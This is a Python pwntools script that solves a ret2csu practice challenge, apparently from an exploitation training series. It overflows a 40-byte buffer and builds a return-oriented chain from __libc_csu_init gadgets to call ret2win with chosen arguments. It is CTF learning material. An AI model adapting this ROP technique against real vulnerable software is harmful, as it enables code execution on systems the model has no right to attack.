# https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf
# ROPE{a_placeholder_32byte_flag!}
# pwn0x80.github.io
 
from pwn import *
elf = ELF('ret2csu')
p = process(elf.path)
#0x0000000000400680 <+64>:	mov    rdx,r15
#0x0000000000400683 <+67>:	mov    rsi,r14
#0x0000000000400686 <+70>:	mov    edi,r13d
#0x0000000000400689 <+73>:	call   QWORD PTR [r12+rbx*8]
mov_call = p64(0x400680)
#0x000000000040069a <+90>:	pop    rbx
#0x000000000040069b <+91>:	pop    rbp
#0x000000000040069c <+92>:	pop    r12
#0x000000000040069e <+94>:	pop    r13
#0x00000000004006a0 <+96>:	pop    r14
#0x00000000004006a2 <+98>:	pop    r15
#0x00000000004006a4 <+100>:	ret    
#raw_input('debug')
pop_reg = p64(0x40069a)


# 0x00000000004006a3 : pop rdi ; ret
pop_rdi = p64(0x00000000004006a3)

# plt ret2win
ret2win = p64(0x400510)
buff = b'A'*40
trash_r12 = p64(0x0600df8)

payload = b"".join([
    buff,
    pop_reg,
    p64(0),
    p64(1),
    trash_r12,
    p64(0xDEADBEEFDEADBEEF),
    p64(0xCAFEBABECAFEBABE),
    p64(0xd00df00dd00df00d),
    mov_call,
    p64(0),
    p64(0),
    p64(0),
    p64(0),
    p64(0),
    p64(0),
    p64(0),
    pop_rdi,
    p64(0xDEADBEEFDEADBEEF),
    ret2win

])

p.sendline(payload)
response = p.recvall()

print(response.decode())



